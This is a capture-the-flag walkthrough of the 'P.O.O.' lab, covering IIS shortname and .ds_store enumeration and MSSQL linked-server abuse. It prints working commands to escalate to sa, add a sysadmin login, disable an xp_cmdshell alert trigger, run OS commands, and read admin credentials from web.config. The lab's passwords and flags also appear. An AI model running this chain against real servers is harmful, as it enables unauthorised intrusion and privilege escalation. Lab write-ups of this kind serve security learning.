# Recon

>[!example] Nmap
```sh
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-19T04:02:55
|_Not valid after:  2054-08-19T04:02:55
|_ssl-date: 2024-08-19T13:53:18+00:00; +3s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Port `80`:

>[!bug] Ffuf - Directories
```sh
ffuf -w ~/Documents/Word\ Lists/raft-medium-words-lowercase.txt -u 'http://10.13.38.11:80/FUZZ' -mc 301,200,401 -rate 30
```
>[!info] Login portal
```url
http://10.13.38.11/admin
```
>[!important] There are using `.ds_store`
>- Web servers that contain a publicly readable `.ds_store` file were vulnerable in [2018](https://nvd.nist.gov/vuln/detail/CVE-2018-6470)
```sh
.ds_store               [Status: 200, Size: 10244, Words: 69, Lines: 51, Duration: 254ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```
>[!bug] Use [`ds_walk`](https://github.com/Keramas/DS_Walk) to enumerate further 
```
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/src
```
>[!info] You can Crack the hashes on crack station if you want but is not very useful

>[!bug] `IIS Shortnames` are `Enabled`
```sh
➜  poo.htb curl -s -X OPTIONS -I 'http://10.13.38.11/ta*~1*'
HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST
Server: Microsoft-IIS/10.0
Public: OPTIONS, TRACE, GET, HEAD, POST
Date: Tue, 20 Aug 2024 12:42:35 GMT
Content-Length: 0
```
>[!info]
>The `shortname` feature in `IIS` allows access to files using their legacy `8.3 filenames`, which can be exploited by attackers for file enumeration and information disclosure.

>[!bug] Use `iis_shortname_scan`
```sh
python3 iis_shortname_scan.py -u 'http://10.13.38.11:80/dev/dca66d38fd916317687e1390a420c3fc/db/'
```
>[!important] We can see a `Shortname` for `poo` following by a slash `_` and word starting with `co`
```sh
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
```
>[!example] Create a word list to fuzz for words that start by `co` only
```sh
grep "^co" ~/Documents/Word\ Lists/raft-medium-words-lowercase.txt > fuzz.txt
```
>[!bug] Fuzz again, this time add file extensions
```sh
ffuf -w ~/Documents/HTB/Endgames/poo.htb/fuzz.txt -u 'http://10.13.38.11:80/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ' -e .txt,.db,.py,.zip
```
>[!danger] Curl the file `poo_connection.txt`
```sh
curl http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
```
>[!important] Take the first `flag` and note the `credentials`
```
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fffb0767f5bd3cbc22f40ff5011ad666}
```
# Huh?!
## Port `1433`

>[!bug] Connect to the database using the credentials
>- Im using [`mssqlclient.py`](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from `impacket`
```sh
python3 mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11
```
>[!bug] Start enumerating using `sysdatabases`
```sql
select name from sysdatabases;
```
>[!bug] Check current user privileges
```sql
select permission_name FROM fn_my_permissions(null, 'server');
```
>[!important] We can connect to other databases
```sql
CONNECT SQL
```
>[!bug] Enumerate the available servers
```sql
select srvname from sysservers;
```
>[!tip] `POO_CONFIG` is available
```
COMPATIBILITY\POO_CONFIG

COMPATIBILITY\POO_PUBLIC
```
>[!bug] Check if you can sent queries to the external server
```sql
select * from openquery([compatibility\poo_config], 'select @@servername;');
```
>[!important] The command was successful
```
------------------------
COMPATIBILITY\POO_CONFIG
```
>[!bug] Check which user in running commands on `POO_CONFIG`
```sql
select * from openquery([compatibility\poo_config], 'select suser_name();');
```
>[!important] This time is the internal user
```
-------------
internal_user
```
>[!info]
>- `internal_user` have the same permissions than `external_user`
```
CONNECT SQL
```
>[!danger] Execute a query from the `poo_public` server that runs a query on the `poo_config` server, which in turn executes another query back on the `poo_public` server
```sql
SELECT * FROM OPENQUERY([compatibility\poo_config], 'SELECT * FROM OPENQUERY([compatibility\poo_public], ''SELECT @@servername;'')');
```
>[!important] It works!
```
------------------------
COMPATIBILITY\POO_PUBLIC
```
>[!bug] But this time who run the query from `POO_CONFIG` is the user `sa`
```sql
SELECT * FROM OPENQUERY([compatibility\poo_config], 'SELECT * FROM OPENQUERY([compatibility\poo_public], ''select suser_name();'')');

--
sa
```
>[!important] `sa` is super admin if we check the privileges we can see all of them
```sql
SELECT * FROM OPENQUERY([compatibility\poo_config], 'SELECT * FROM OPENQUERY([compatibility\poo_public], ''SELECT permission_name FROM fn_my_permissions(NULL, ''''SERVER'''')'')');
```
>[!danger] Lets create a new super user by using `exec`
```sql
EXEC ('EXEC (''EXEC sp_addlogin ''''b0llull0s'''', ''''tokyo123!'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```
>[!danger] Assign `sysadmin` role
```sql
EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''b0llull0s'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```
>[!important] Start a new session with our brand new user
```sh
mssqlclient.py b0llull0s:'tokyo123!'@10.13.38.11
```
>[!bug] List all the databases again
```sql
select name from sysdatabases;
```
>[!tip] This time we can see the flag
```sql
----------
master

tempdb

model

msdb

POO_PUBLIC

flag
```
>[!info] There is only one table called also flag inside
```sql
select name from flag.sys.tables;
```
>[!danger] Read the flag
```sql
select * from flag.dbo.flag;
```
# Backtrack

>[!tip] Now that we are `sa` we should try to enable `xp_cmdshell` to execute commands
```sql
enable_xp_cmdshell
```
>[!warning] But we got an error due to the server triggers
```
[-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell
```
>[!bug] Simply disable `alert_xp_cmdshell`
```mysql
select name from sys.server_triggers;
disable trigger alert_xp_cmdshell on all server;
```
>[!tip] And now we can `enable_xp_cmdshell`
```
enable_xp_cmdshell
```
>[!bug] Now using `xp_cmdshell` we can execute command as `nt service`
```sql
xp_cmdshell whoami
---------------------------
nt service\mssql$poo_public
```
>[!bug] Enumerating in `wwwroot` we can find a `web.config` file
```sql
xp_cmdshell dir C:\inetpub\wwwroot
```
>[!tip] But we dont have permissions to read it
```sql
xp_cmdshell type C:\inetpub\wwwroot\web.config
-----------------
Access is denied
```
>[!danger] We can try to execute commands using the python module `sp_execute_external_script`
```sql
exec sp_configure 'external scripts enabled', 1
exec sp_execute_external_script @language=N'python', @script=N'import os; os.system("whoami");';
```
>[!bug] Let's see if we can read the `XML` file now
```sql
exec sp_execute_external_script @language=N'python', @script=N'import os; os.system("type C:\inetpub\wwwroot\web.config");';
```
>[!tip] Note the admin credentials
```
name="Administrator"
password="EverybodyWantsToWorkAtP.O.O."
```
>[!danger] Use `curl` to login on `/admin`
```sh
curl http:/10.13.38.11/admin/ -u Administrator:EverybodyWantsToWorkAtP.O.O.
```
# Foothold
